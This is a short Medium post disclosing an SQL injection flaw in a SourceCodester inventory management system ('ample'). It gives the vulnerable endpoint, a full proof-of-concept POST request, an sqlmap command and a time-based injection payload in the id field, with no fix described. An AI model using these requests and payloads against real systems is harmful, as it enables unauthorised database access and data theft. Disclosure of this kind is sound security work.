=== Content from medium.com_4f91fe89_20250114_215523.html ===
[Open in app](https://rsci.app.link/?%24canonical_url=https%3A%2F%2Fmedium.com%2Fp%2Ff6d67247c7ae&%7Efeature=LoOpenInAppButton&%7Echannel=ShowPostUnderUser&source=---top_nav_layout_nav----------------------------------)

Sign up

[Sign in](/m/signin?operation=login&redirect=https%3A%2F%2Fmedium.com%2F%40heishou%2Finventory-management-system-sql-injection-f6d67247c7ae&source=post_page---top_nav_layout_nav-----------------------global_nav-----------)

[Write](/m/signin?operation=register&redirect=https%3A%2F%2Fmedium.com%2Fnew-story&source=---top_nav_layout_nav-----------------------new_post_topnav-----------)

Sign up

[Sign in](/m/signin?operation=login&redirect=https%3A%2F%2Fmedium.com%2F%40heishou%2Finventory-management-system-sql-injection-f6d67247c7ae&source=post_page---top_nav_layout_nav-----------------------global_nav-----------)

![](https://miro.medium.com/v2/resize:fill:64:64/1*dmbNkD5D-u45r44go_cf0g.png)
# inventory management system SQL injection

[![heishou](https://miro.medium.com/v2/resize:fill:88:88/1*pR2bjEaLc11S00QyPXDWFA.png)](/%40heishou?source=post_page---byline--f6d67247c7ae--------------------------------)

[heishou](/%40heishou?source=post_page---byline--f6d67247c7ae--------------------------------)

·

[Follow](/m/signin?actionUrl=https%3A%2F%2Fmedium.com%2F_%2Fsubscribe%2Fuser%2Ffc1fddf341cd&operation=register&redirect=https%3A%2F%2Fmedium.com%2F%40heishou%2Finventory-management-system-sql-injection-f6d67247c7ae&user=heishou&userId=fc1fddf341cd&source=post_page-fc1fddf341cd--byline--f6d67247c7ae---------------------post_header-----------)

2 min read·Dec 26, 2023

--

Listen

Share

Manufacturer: [www.sourcecodester.com/](http://www.sourcecodester.com/)
 Download address: [www.sourcecodester.com/sites/default/files/download/mayuri\_k/ample.zip](http://www.sourcecodester.com/sites/default/files/download/mayuri_k/ample.zip)
 Affected Version: July 30, 2023
 Vulnerability Description:
 No filtering or escape operations are performed when user input is received. This allows malicious users to insert malicious SQL statements by modifying id, product\_name, brand, and other fields in POST requests.
 There is a risk in the $obj->update() function call part of constructing SQL queries directly from unvalidated and unprocessed user data. An attacker could exploit this to execute additional database instructions causing security issues
 Defect Code:

![]()

POC：

```
POST /ample/app/action/edit_product.php HTTP/1.1
Host: localhost
Content-Length: 168
sec-ch-ua: "(Not(A:Brand";v="8", "Chromium";v="98"
Accept: */*
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
X-Requested-With: XMLHttpRequest
sec-ch-ua-mobile: ?0
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.102 Safari/537.36
sec-ch-ua-platform: "Windows"
Origin: http://localhost
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: cors
Sec-Fetch-Dest: empty
Referer: http://localhost/ample/index.php?page=product_edit&&edit_id=1
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Cookie: USER_NAME_COOKIE=admin; SID_1=aa141d36; mailpoet_page_view=%7B%22timestamp%22%3A1694409700%7D; mailpoet_subscriber=%7B%22subscriber_id%22%3A2%7D; _ga=GA1.1.324136046.1702458922; Hm_lvt_6a3c7d9bb52a48ffadde32007d2a259e=1702459185; _pk_id.1.1fff=4343a030b8a53617.1702459185.; PHPSESSID=c0mhj8vg05lp9sf5cp7a0ummqa
Connection: close

product_name=AMD+Ryzen+9+5900X+Processor&id=1&brand=Ryzen&p_catagory=1&product_source=factory&sku=456AD5S&quantity=48&alert_quantity=5&buy_price=3653&selling_price=4500
```

SQLmap:
python sqlmap.py -r 2.txt -p id — level 5 — risk 3

![]()
```
payload :
product_name=AMD Ryzen 9 5900X Processor&id=1;SELECT SLEEP(5)#&brand=Ryzen&p_catagory=1&product_source=factory&sku=456AD5S&quantity=48&alert_quantity=5&buy_price=3653&selling_price=4500
```

--

--

[![heishou](https://miro.medium.com/v2/resize:fill:96:96/1*pR2bjEaLc11S00QyPXDWFA.png)](/%40heishou?source=post_page---post_author_info--f6d67247c7ae--------------------------------)[![heishou](https://miro.medium.com/v2/resize:fill:128:128/1*pR2bjEaLc11S00QyPXDWFA.png)](/%40heishou?source=post_page---post_author_info--f6d67247c7ae--------------------------------)Follow[## Written by heishou](/%40heishou?source=post_page---post_author_info--f6d67247c7ae--------------------------------)[1 Follower](/%40heishou/followers?source=post_page---post_author_info--f6d67247c7ae--------------------------------)·[3 Following](/%40heishou/following?source=post_page---post_author_info--f6d67247c7ae--------------------------------)

Pretending to make you fly

Follow
## No responses yet

[Help](https://help.medium.com/hc/en-us?source=post_page-----f6d67247c7ae--------------------------------)[Status](https://medium.statuspage.io/?source=post_page-----f6d67247c7ae--------------------------------)[About](/about?autoplay=1&source=post_page-----f6d67247c7ae--------------------------------)[Careers](/jobs-at-medium/work-at-medium-959d1a85284e?source=post_page-----f6d67247c7ae--------------------------------)[Press](pressinquiries%40medium.com?source=post_page-----f6d67247c7ae--------------------------------)[Blog](https://blog.medium.com/?source=post_page-----f6d67247c7ae--------------------------------)[Privacy](https://policy.medium.com/medium-privacy-policy-f03bf92035c9?source=post_page-----f6d67247c7ae--------------------------------)[Terms](https://policy.medium.com/medium-terms-of-service-9db0094a1e0f?source=post_page-----f6d67247c7ae--------------------------------)[Text to speech](https://speechify.com/medium?source=post_page-----f6d67247c7ae--------------------------------)[Teams](/business?source=post_page-----f6d67247c7ae--------------------------------)


